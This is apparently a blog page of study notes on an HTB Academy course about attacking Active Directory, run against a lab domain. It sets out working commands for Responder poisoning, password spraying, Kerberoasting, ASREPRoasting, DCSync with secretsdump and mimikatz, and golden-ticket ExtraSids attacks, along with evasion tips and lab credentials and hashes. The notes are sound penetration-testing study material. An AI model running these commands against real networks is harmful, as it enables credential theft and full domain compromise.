---
layout: single
title:  "HTB Academy - Active Directory Enumeration and Attacks"
categories: 
  - OSCP Notes
tags:
  - htb-academy
toc: true
toc_label: "Contents"
toc_icon: "list"  # corresponding Font Awesome icon name (without fa prefix)
excerpt: ""
permalink: /posts/ad-enumeration-and-attacks-notes
author_profile: false
sidebar:
  nav: "navbar"
---

## Initial Enumeration

### External Recon

Useful for validating information provided, or to find additional information that can be used in our own penetration test.

* E.g., Credentials, password leaks for the company.

What to look for:

* IP space - ASN, netblocks, DNS entries etc.
* Domain information - Administrators, subdomains, MX/DNS servers, etc.
* Schema format - Valid email accounts, AD usernames, password policies to aid with spraying/brute forcing.
* Data disclosures - Published files, leaks in Git repositories, etc.
* Breach data - Publicly released credentials, etc.

Useful tools:

* Address spaces, ASN - BGP Toolkit, IANA, `arin`, `RIPE`
* DNS - `Domaintools`, ICANN, `viewdns.info`
* Social Media (LinkedIn, Twitter)
* Public-facing Company websites
* Cloud and Dev Spaces - GitHub, Cloud storage (`grayhatwarfare.com`), Google dorking
* Breach data - `HaveIBeenPwned`, `Dehashed`

Usernames can be harvested using `linkedin2username`.

### Internal Enumeration

Key data points to note:

* AD Users
* AD Joined Computers (DCs, file servers, SQL servers, web servers, MX, DB, etc.)
* Key services (Kerberos, NetBIOS, LDAP, DNS)
* Vulnerable hosts and services

**Passive Host Identification through captured network packets**:

* Using `Wireshark`: Sniff traffic and check for ARP packets, as well as MDNS.
* Using `tcpdump`: `sudo tcpdump -i ens224` to sniff traffic on a specific interface (make sure to use the interface on the internal network).
* On Windows, we can use `pktmon.exe`, which is built into Windows 10.
* We can also use `Responder` to passively analyse LLMNR, NBT-NS  and MDNS packets; use the `-A` option to analyse.

**Active Host Identification**:

* Use `fping` to do a ping scan: `fping -asgq <target CIDR block>`
* `-a` option shows alive targets.
* `-s` option to print stats.
* `-g` to generate a list of targets.
* `-q` to not show per-target results.
* Use `nmap` to enumerate the list of alive targets further.

**User enumeration**:

* Use `kerbrute`, along with user lists like `jsmith.txt` and `jsmith2.txt`. Point `kerbrute` towards the identified DCs.
  `kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users`

## LLMNR/NBT-NS Poisoning

Conduct network poisoning and act as a MITM to obtain hashes. This can be done by poisoning LLMNR or NBT-NS for host identification, when DNS fails.

* LLMNR runs on port 5355, NBT-NS runs on port 137.
* We can use `Responder` to poison resolution requests over these protocols. This allows us to capture NTLM hashes.

The basis of this attack depends on the user providing an invalid hostname (e.g., `printer01.inlanefreight.local` instead of `print01.inlanefreight.local`).

* Our `Responder` instance will then pretend to be the invalid host. Afterwards, the requester sends an authentication request to our instance, which includes the NTLM hash. This hash can be cracked or used in SMB Relay attack.

To prevent these attacks, we can disable LLMNR and NBT-NS.

* LLMNR can be disabled through group policies.
* NBT-NS must be disabled locally on each host.

### From Linux

Tools that can be used: `Responder`, `Inveigh` and `Metasploit`.

`Responder` on default settings: `sudo responder -I <target interface>`.

Useful `Responder` options:

* `-A` for passive analysis.
* `-wf` to start a WPAD rogue proxy server and fingerprint the remote host OS and version.
* `-v` for increased verbosity.
* `-F` for forced WPAD authentication.
* `-P` for proxy authentication.

To crack hashes, we can use `hashcat` on mode 5600 (NTLM).

### From Windows

Tools that can be used: `Inveigh`.

* Note that `Responder` is also available as an executable.

To use `Inveigh`:

```
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
```

We can start `Inveigh` with LLMNR and NBNS spoofing using:
`Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`

`Inveigh` also has a C# executable version, which provides an interactive console.

* To run: `.\Inveigh.exe`.
* To get all commands available in the interactive console: `HELP`
* To view captured hashes: `GET NTLMV2UNIQUE`
* To view usernames: `GET NTLMV2USERNAMES`

## Password Spraying

With valid credentials, we can obtain the password policy remotely using `crackmapexec` or `rpcclient`:
`crackmapexec smb <ip> -u <username> -p <password> --pass-pol`.

### SMB Null Session

Using a null SMB session/LDAP anonymous bind, we can also get the password policy.

* (Linux) Sign in using `rpcclient` to a null SMB session, then issue the `getdompwinfo` command to view the password policy.
* We can use `enum4linux` for this as well.

From Windows, we can attempt to connect using a null session:
`net use \\DC01\ipc$ "" /u:""`

* If we wish to try a credential pair, replace `""` with our password wrapped in quotes, and replace `/u:""` with our username wrapped in quotes. For example:
  `net use \\DC01\ipc$ "password" /u:guest`

### LDAP Anonymous Bind

Legacy configuration; we can use LDAP-specific enumeration tools like `windapsearch.py`, `ldapsearch`, `ad-ldapdomaindump.py` etc.

* Using `ldapsearch`, we can get the password policy as follows:
  `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength`

From Windows, we can use `net.exe` if we are authenticated:
`net accounts`

* Alternatively, we can use `PowerView` on PS:

```
import-module .\PowerView.ps1
Get-DomainPolicy
```

### Default Domain Password Policy

| Policy                                      | Default Value |
| ------------------------------------------- | ------------- |
| Enforce password history                    | 24 days       |
| Maximum password age                        | 42 days       |
| Minimum password age                        | 1 day         |
| Minimum password length                     | 7             |
| Password must meet complexity requirements  | Enabled       |
| Store passwords using reversible encryption | Disabled      |
| Account lockout duration                    | Not set       |
| Account lockout threshold                   | 0             |
| Reset account lockout counter after         | Not set       |

### Making a target user list

To get a list of valid domain users, we can:

* Use an SMB NULL session to retrieve a complete list of domain users from the DC
* Utilize LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
* Use a tool like `kerbrute` to validate users from a word list (`statistically-likely-usernames` or `linkedin2username`)
* Using a set of credentials that are provided/captured through `Responder`, or through another password spray with a smaller wordlist

SMB NULL enumeration can be done using `enum4linux`, `rpcclient` and `crackmapexec`:
`enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`

```
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers 
```

`crackmapexec smb 172.16.5.5 --users`

LDAP anonymous bind enumeration can be done using `windapsearch` and `ldapsearch`:

* `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "`
* `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`

`kerbrute` utilises Kerberos pre-authentication, and this is a stealthy way to perform user enumeration as it does not generate the event ID 4625 (Account failed to logon).

* The tool sends a TGT request to the DC using a specified username (event ID 4768  - TGT was requested). If the username is valid, the KDC will prompt for Kerberos pre-authentication. Else, it returns `PRINCIPAL UNKNOWN`. This does not count towards logon failures and does not lock out accounts.
* However, when Kerberos pre-authentication is used for password spraying, failed authentication attempts can lock out accounts.

`kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`

Finally, with valid credentials, we can also get a full list of users using `crackmapexec`:
`sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users`

### Password Spraying from Linux

We can use `rpcclient`, and check for `Authority Name` in the response (which indicates a valid login):
`for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done`

Alternatively, we can use `kerbrute`:
`kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1`

`crackmapexec` can also be used:
`sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +`

If the local administrator password/hash is obtained, we can try to spray the same password or hash across multiple hosts.

* This is due to local administrator password reuse, which can arise due to the use of gold images.
* We can use `crackmapexec` for this. It is worth to target high-value hosts such as SQL or Microsoft Exchange servers.

If we wish to spray NT hashes using `crackmapexec`, make sure to use the `--local-auth` option, which tells the tool to only attempt log in once on each machine, to reduce the chance of account lockout.

* This is crucial for the built-in administrator.
* Without the `--local-auth` option, the tool attempts to authenticate using the current domain, which can quickly result in account lockouts.

`sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +`

### Password Spraying from Windows

We can use the `DomainPasswordSpray` tool.

* Once we are authenticated, the tool generates a user list from AD, queries the domain password policy and excludes user accounts within one attempt of lock out.
* If we want to provide our own user list, we use the `-UserList` option.

Likewise, we can use `kerbrute` on Windows as well.

## Credentialed Enumeration

### Linux

We can use `crackmapexec` for user, group and logged on user enumeration:

* Domain users: `--users`.  Crucially, we can view the `badPwdCount` attribute which tells us of accounts that are close to lock out.
* Domain groups: `--groups`. This allows us to note down groups of interest.
* Logged on domain users: `--loggedon-users`

For share enumeration, we can use `smbmap`.

For more extensive enumeration options, we can use `rpcclient`.

* When enumerating users, we can use the `rid`, or relative identifier of users. The RID is a part of the SID of the user object, and is unique to each user.
* However, note that some accounts have the same RID irrespective of host. An example would be the built-in administrator account, with an RID of 500, or `0x1F4` in hexadecimal.

For remote access, we can use `psexec.py` or `wmiexec.py`.

* `psexec.py` will start a shell as `SYSTEM`.
* `wmiexec.py` starts a shell as the provided user, which may be stealthier than `psexec`.

For LDAP enumeration, we can use `windapsearch`.

* The `--da` option lets us enumerate domain admins group members.
* The `-PU` option lets us find privileged users through a recursive search on nested groups.

#### BloodHound

Ingest AD data through the collector, and visualise it in the GUI.

Running BloodHound:
`sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all`

* Use the `-c` option to specify what data to collect.

### Windows

ActiveDirectory PS Module:

* To import the module for use: `Import-Module ActiveDirectory`, then `Get-Module` to confirm that the module is loaded.
* To get information about the domain: `Get-ADDomain`
* To get information about a user: `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`.
* Here, we check for users with `ServicePrincipalName != NULL` as they may be susceptible to Kerberoasting attack.
* To verify domain trusts: `Get-ADTrust -Filter *`
* `*` will return all domain trusts.
* To enumerate groups: `Get-ADGroup -Filter * | select name`.
* To get info about a group: `Get-ADGroup -Identity "Backup Operators"`
* To get group membership: `Get-ADGroupMember -Identity "Backup Operators"`

#### PowerView

| **Command**                         | **Description**                                                                            |
| ----------------------------------- | ------------------------------------------------------------------------------------------ |
| `Export-PowerViewCSV`               | Append results to a CSV file                                                               |
| `ConvertTo-SID`                     | Convert a User or group name to its SID value                                              |
| `Get-DomainSPNTicket`               | Requests the Kerberos ticket for a specified Service Principal Name (SPN) account          |
| **Domain/LDAP Functions:**          |                                                                                            |
| `Get-Domain`                        | Will return the AD object for the current (or specified) domain                            |
| `Get-DomainController`              | Return a list of the Domain Controllers for the specified domain                           |
| `Get-DomainUser`                    | Will return all users or specific user objects in AD                                       |
| `Get-DomainComputer`                | Will return all computers or specific computer objects in AD                               |
| `Get-DomainGroup`                   | Will return all groups or specific group objects in AD                                     |
| `Get-DomainOU`                      | Search for all or specific OU objects in AD                                                |
| `Find-InterestingDomainAcl`         | Finds object ACLs in the domain with modification rights set to non-built in objects       |
| `Get-DomainGroupMember`             | Will return the members of a specific domain group                                         |
| `Get-DomainFileServer`              | Returns a list of servers likely functioning as file servers                               |
| `Get-DomainDFSShare`                | Returns a list of all distributed file systems for the current (or specified) domain       |
| **GPO Functions:**                  |                                                                                            |
| `Get-DomainGPO`                     | Will return all GPOs or specific GPO objects in AD                                         |
| `Get-DomainPolicy`                  | Returns the default domain policy or the domain controller policy for the current domain   |
| **Computer Enumeration Functions:** |                                                                                            |
| `Get-NetLocalGroup`                 | Enumerates local groups on the local or a remote machine                                   |
| `Get-NetLocalGroupMember`           | Enumerates members of a specific local group                                               |
| `Get-NetShare`                      | Returns open shares on the local (or a remote) machine                                     |
| `Get-NetSession`                    | Will return session information for the local (or a remote) machine                        |
| `Test-AdminAccess`                  | Tests if the current user has administrative access to the local (or a remote) machine     |
| **Threaded 'Meta'-Functions:**      |                                                                                            |
| `Find-DomainUserLocation`           | Finds machines where specific users are logged in                                          |
| `Find-DomainShare`                  | Finds reachable shares on domain machines                                                  |
| `Find-InterestingDomainShareFile`   | Searches for files matching specific criteria on readable shares in the domain             |
| `Find-LocalAdminAccess`             | Find machines on the local domain where the current user has local administrator access    |
| **Domain Trust Functions:**         |                                                                                            |
| `Get-DomainTrust`                   | Returns domain trusts for the current domain or a specified domain                         |
| `Get-ForestTrust`                   | Returns all forest trusts for the current forest or a specified forest                     |
| `Get-DomainForeignUser`             | Enumerates users who are in groups outside of the user's domain                            |
| `Get-DomainForeignGroupMember`      | Enumerates groups with users outside of the group's domain and returns each foreign member |
| `Get-DomainTrustMapping`            | Will enumerate all trusts for the current domain and any others seen.                      |

The `-Recurse` option is useful for enumerating nested group memberships.

To acquire credentials or sensitive data in AD environments, we can use `Snaffler`.
`.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data`

* `-s` prints output to the console.
* `-d` specifies the domain.
* `-o` logs output to a logfile.
* `-v` specifies the verbosity level.

#### BloodHound

On Windows, we run `SharpHound.exe` to collect data:
`.\SharpHound.exe -c All --zipfilename ILFREIGHT`

Afterwards, upload the zip file and interact with the GUI.

Start off by typing `domain:` into the search bar and look for our domain of interest. Then, we can run a few pre-built queries for analysis.

### Living off the Land

#### Basic Enumeration Commands

| **Command**                                             | **Result**                                                                                 |
| ------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `hostname`                                              | Prints the PC's Name                                                                       |
| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                               |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                        |
| `ipconfig /all`                                         | Prints out network adapter state and configurations                                        |
| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
| `echo %logonserver%`                                    | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) |

`systeminfo` provides all of the above information in one single output.

To bypass detection, we can attempt to downgrade PS: `powershell.exe -version 2`

* This can be helpful in cases where older versions of PS remain installed on a host.
* PS 2.0 and older will not have script block logs on Event Viewer, thus allowing for bypassing of detection.
* However, the command issued to downgrade PS will be logged.

To check firewall status from PS: `netsh advfirewall show allprofiles`

To check Windows Defender status from `cmd`: `sc query windefend`

* From PS: `Get-MpComputerStatus`

To view logged on users: `qwinsta`

Routing enumeration:

* `arp -a` to view ARP routes.
* `route print` to view IP routes.

#### Quick WMI checks

| **Command**                                                                          | **Description**                                                                                        |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |

#### Table of Useful Net Commands (Domain enumeration)

| **Command**                                     | **Description**                                                                                                              |
| ----------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `net accounts`                                  | Information about password requirements                                                                                      |
| `net accounts /domain`                          | Password and lockout policy                                                                                                  |
| `net group /domain`                             | Information about domain groups                                                                                              |
| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                      |
| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                          |
| `net group "Domain Controllers" /domain`        | List PC accounts of domains controllers                                                                                      |
| `net group <domain_group_name> /domain`         | User that belongs to the group                                                                                               |
| `net groups /domain`                            | List of domain groups                                                                                                        |
| `net localgroup`                                | All available groups                                                                                                         |
| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators`                 | Information about a group (admins)                                                                                           |
| `net localgroup administrators [username] /add` | Add user to administrators                                                                                                   |
| `net share`                                     | Check current shares                                                                                                         |
| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                               |
| `net user /domain`                              | List all users of the domain                                                                                                 |
| `net user %username%`                           | Information about the current user                                                                                           |
| `net use x: \computer\share`                    | Mount the share locally                                                                                                      |
| `net view`                                      | Get a list of computers                                                                                                      |
| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                        |
| `net view \computer /ALL`                       | List shares of a computer                                                                                                    |
| `net view /domain`                              | List of PCs of the domain                                                                                                    |

Note: using `net1` instead of `net` will execute the same functionality.

* Useful for evasion.

As `SYSTEM`, we can run `dsquery` to query domain objects.

* `dsquery user` to query users.
* `dsquery computer` to query computers.
* `dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"` for a wildcard search on OU objects.

We can also make use of LDAP search filters for our queries.

* Here, we query UAC (user account control) attributes.

OID match strings:

1. `1.2.840.113556.1.4.803`: For exact matches (useful for single attributes).
2. `1.2.840.113556.1.4.804`: For any match (useful for multiple attributes).
3. `1.2.840.113556.1.4.1941`: For Distinguished Name matches.

Usage example:
`dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)"`

* This queries for domain controller objects.

Logical operators like `&` and `!` and `|` can be used to join queries.

* e.g., `(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`

## Kerberoasting

Kerberoasting targets Service Principal Name (SPN) accounts. In essence, these are domain accounts used for services, or service accounts.

* SPNs associate service instances with service accounts.

As long as we have valid credentials, we can retrieve TGS tickets for a service account using the SPN.

* Then, crack the ticket offline to get a cleartext password for the account (Note that the ticket is encrypted with the password hash).
* This is crucial as service accounts are usually highly privileged.

To do this, we need valid credentials (password/NT hash/TGT) and the IP of the DC.

### From Linux

We can use `GetUserSPNs.py`:

* List SPN accounts: `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend`
* Request TGS tickets: `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request`
* Request TGS ticket for specific account: `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev`

We can use the `-outputfile` option to write the TGS tickets to a file for cracking.

Once we have the TGS ticket, we can crack it using `hashcat` on mode 13100.

Verify the account permissions by using `crackmapexec`, `Pwn3d!` should appear to confirm that our account has local admin permissions.

### From Windows

#### Manual method

Using `setspn` and `mimikatz`.

Enumerate SPNs: `.\setspn.exe -Q */*`. Note that this gives computer accounts as well, which we want to ignore.

Request TGS tickets:

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

* Here, we are using the `System.IdentityModel` object.
* Feed in the SPN as an argument.

This loads the tickets into memory, and we can extract them using `mimikatz`.
`kerberos::list /export`.

* To export in `base64` format instead, we can specify `base64 /out:true` before running the command. Note that the `base64` encoded string must be converted to `kirbi` format.

The `kirbi` files can then be converted to `john` format using `kirbi2john`, and cracked with `john`.

* If we want to use `hashcat`, we have to modify the format: `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`

#### Automated method

Using PowerView:

* To enumerate SPNs: `Get-DomainUser * -spn | select samaccountname`
* To get ticket: `Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat`

Using `Rubeus`:

* Enumerate Kerberoastable users: `.\Rubeus.exe kerberoast /stats`
* Get tickets with no line-wrap: `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`
* This targets administrative accounts.

## ACL Abuse

### Enumerating ACLs

We can enumerate ACLs with PowerView, using the `Find-InterestingDomainAcl` cmdlet.

* However, this will yield too many results for us to sieve through.

A better way is to only review the ACLs of users which we have control over.

* Get the SID of the user using the `Convert-NameToSid` cmdlet, and pass it as a filter to the `Get-DomainObjectACL` cmdlet, where we only look for objects which our user has rights to:
  `Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}`

Using BloodHound,

* Set our controlled user as the starting node, then look for outbound control rights.
* Look for transitive object control.

### ACL Abuse

Provided scenario:

1. Use the `wley` user to change the password for the `damundsen` user
2. Authenticate as the `damundsen` user and leverage `GenericAll` rights to add a user that we control to the `Help Desk Level 1` group
3. Take advantage of nested group membership in the `Information Technology` group and leverage `GenericAll` rights to take control of the `adunn` user

First step: authenticate as `wley` and create a new password for `damundsen`.

* Authenticate as `wley` using a `PSCredential` object.
* Create a new password as a `SecureString` and use `Set-DomainUserPassword` to change the password of `damundsen`.

Next step: authenticate as `damundsen` and add `damundsen` to the `Help Desk Level 1` group.

* `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`
* Confirm group addition using `Get-DomainGroupMember`.

Final step: Using `GenericAll` rights, we can modify SPN of `adunn` to execute a Kerberoasting attack.

* Create a fake SPN with `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`
* Kerberoast with `Rubeus`: `.\Rubeus.exe kerberoast /user:adunn /nowrap`
* Finally, crack the obtained hash with `hashcat`.

## DCSync Attack

An attack to steal the AD password database using Directory Replication Service Remote Protocol.

* Request a DC to replicate passwords via the `DS-Replication-Get-Changes-All` extended right.
* Domain/enterprise admins and default domain admins have this right.

Extracting NTLM hashes and Kerberos Keys using `secretsdump.py`:
`secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5`

* `-just-dc` option extracts NTLM hashes and Kerberos Keys from the `NTDS.dit` file.
* `-just-dc-ntlm` option extracts only NTLM hashes.
* `-just-dc-user <USERNAME>` extracts data for a specific user.
* `-pwd-last-set` shows us when each account's password was last changed.
* `-history` provides a dump of password history.
* `-user-status` allows us to check if a user is disabled.

Note that this can dump cleartext passwords if reversible encryption is enabled for accounts.

* Check using `Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol`

Attacking using `mimikatz`:

* Run PowerShell in the context of the DCSync user: `runas /netonly /user:INLANEFREIGHT\adunn powershell`
* Start `mimikatz`: `.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator" exit`

## Privileged Access

We can use BloodHound to view the following permissions:

* CanRDP
* CanPSRemote (use WinRM)
* SQLAdmin

With PowerView, we can use `Get-NetLocalGroupMember` to enumerate members of the respective groups.

On BloodHound, we can use this query to view WinRM users:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

To view SQL Admins:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

* With MSSQL access, we can `enable_xp_cmdshell` to execute commands via the DB.
* For example, `xp_cmdshell whoami /priv`

## Kerberos Double Hop

WinRM/PS authentication using Kerberos does not result in the storage of credentials in memory.

* This results in the credentials not being transferred over multiple hops.

Workaround 1: Using a `PSCredential` Object

* Store our login credentials as a `PSCredential` Object, which allows us to pass this object along with our command for authentication using the `-credential` option.

Workaround 2: `Register-PSSessionConfiguration`

* `Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm`
* Once done, restart the WinRM Service using `Restart-Service WinRM`
* Note that this method doesn't work on `evil-winrm` as it requires GUI access and a proper PS console.

## Bleeding Edge Vulnerabilities

### NoPac (SamAccountName Spoofing)

Exploit - changing the SamAccountName of a computer account to that of the Domain Controller.

* Then, request a TGT and change the computer account name back to its original name.
* Now, request a TGS using the TGT with the spoofed DC name. As a result, Kerberos TGS tickets are requested under the name of the DC instead of the expected host (due to a closest name match). This can grant a SYSTEM shell on the DC.

### PrintNightmare

Print Spooler vulnerability.

### PetitPotam (MS-EFSRPC)

LSA spoofing vulnerability, allows an unauthenticated attacker to coerce a DC to authenticate over another host using NTLM on port 445, via LSARPC.

## Misc Misconfigurations

### Microsoft Exchange

Exchange Windows Permissions group users can write DACL to the domain, allowing the addition of users.

Organization Management group (Exchange admins) can access user mailboxes.

Dumping credentials can yield NTLM hashes/cleartext credentials due to Outlook and Exchange caching credentials in memory after a successful login.

Notable attack - `PrivExchange` attack, which elevates permissions to SYSTEM as Exchange is overprivileged.

### Printer Bug

MS-RPRN Printer Bug.

### MS14-068

PAC forging, where a KDC will accept a forged PAC. Can be exploited using Impacket or `PyKEK`.

### LDAP Credential sniffing

A good way to steal LDAP credentials would be to use the `test connection` function, and connect to our `nc` listener over port 389.

### DNS Dumping

We can use `adidnsdump` to enumerate DNS records in a domain, which can allow us to find a new attack vector.

* `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r`

### Misc

Passwords in `Description` or `Notes` fields. Can be enumerated with PowerView.
`Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}`

### PASSWD_NOTREQD

If this field is set, accounts do not need to follow the password policy, nor do they need to have passwords.
`Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol`

### SMB Shares and SYSVOL Script credentials

Passwords could be found in the `SYSVOL` SMB share. If credentials are found, we can attempt to spray these credentials using a tool like `CrackMapExec`.

When a new GPP is created, an XML file (`Groups.xml`) is created in this share, which can contain passwords.

* The `cpassword` attribute is AES-256 encrypted, but can be decrypted.
* We can use a tool like `gpp-decrypt` to decrypt the password.
* We can also use a tool like `Get-GPPPassword.ps1` to locate these passwords automatically.

`Registry.xml` file can also be found in `SYSVOL` share, which may contain credentials.

* We can use `gpp_autologin` module of `crackmapexec` for this: `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin`

### ASREPRoasting

We can obtain the TGT for accounts with `Do not require Kerberos pre-authentication` setting enabled.

* The authentication service reply (AS_REP) is encrypted with the account password, and any domain user can request this.

Note: if we have `GenericWrite`/`GenericAll` permissions over an account, we can enable this attribute and do an ASREPRoasting attack.

Enumeration with `PowerView`: `Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl`

`Rubeus` attack: `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat`

* Then crack using `hashcat` on mode 18200.

`Kerbrute`: `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt`

* Note that the tool automatically does the attack on affected accounts with no Kerberos pre-authentication.

`Impacket`: `GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users`

### GPO Abuse

Having control of a GPO allows us to add additional rights to a user (SeDebugPrivilege, SeImpersonatePrivilege etc.), add local admins or create scheduled tasks.

Enumeration:

* `Get-GPO -All | Select DisplayName`
* `PowerView`: `Get-DomainGPO | select displayname`

Enumerating user GPO rights:

```
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

 View GPO Name (from GUID): `Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`

These rights can also be viewed in BloodHound.

We can abuse these misconfigurations by using a tool such as `SharpGPOAbuse`.

## Domain Trusts

Enumerating trusts:

```
Import-Module activedirectory
Get-ADTrust -Filter *
```

* Child domains can be identified by the `IntraForest=True` attribute when calling `Get-ADTrust`.
* PowerView: `Get-DomainTrust`, `Get-DomainTrustMapping`
* We can enumerate users in child domains/trusted domains using `Get-DomainUser`

Enumeration on `cmd`: `netdom query /domain:inlanefreight.local trust`

* Query DCs: `netdom query /domain:inlanefreight.local dc`
* Query workstations: `netdom query /domain:inlanefreight.local workstation`

### Attacking Child -> Parent Trusts from Windows

SID History - tracks a user's SIDs in different domains, to ensure access.

* We can inject an administrator account to the SID history of another account, which grants us the permissions of the administrator.
* This attack works only if there is a lack of SID filtering protection (used to protect against cross domain authentication over a trust). We have to spoof the ticket from our compromised child domain.
* Note that our target user (whom we wish to grant more permissions) does not need to exist.

`mimikatz` ExtraSids attack:

* Firstly, obtain KRBTGT account hash in the child domain: `mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`. This allows us to spoof TGT tickets (golden ticket attack).
* Then, get the SID of the child domain using `Get-DomainSID`.
* Then, get the SID of the enterprise admins group using `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid`.
* Now, using `mimikatz`, create a Golden Ticket: `kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt`
* We now have a ticket for our user residing in memory (view using `klist`)

`Rubeus`: `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt`

* Pass the `krbtgt` account hash, which is RC4 encrypted.
* `/sids` grants our account the same permissions as the enterprise admins group.

With the golden ticket, we can access resources in the parent domain (like file shares in the parent domain DC), or perform another attack like DCSync.

* Test access in parent domain: `ls \\academy-ea-dc01.inlanefreight.local\c$`
* DCSync for a user in parent domain: `lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL`

